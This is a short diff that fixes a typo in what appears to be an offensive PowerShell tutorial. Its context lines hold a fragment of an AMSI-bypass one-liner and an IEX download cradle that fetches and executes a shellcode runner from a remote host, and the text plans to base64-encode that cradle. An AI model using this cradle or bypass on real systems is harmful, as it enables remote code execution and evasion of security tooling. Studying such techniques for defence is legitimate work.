@@ -137,7 +137,7 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 IEX(New-Object System.Net.WebClient).downloadString('http://192.168.1.1/run.ps1')
 
-The run.ps1 file is a powershell shellcode runner. Due to the complexity of this technique, we will base64 encode our PowerShell download cradle ass follows:
+The run.ps1 file is a powershell shellcode runner. Due to the complexity of this technique, we will base64 encode our PowerShell download cradle as follows:
 ~# pwsh
 ❯ pwsh
 PowerShell 7.2.1
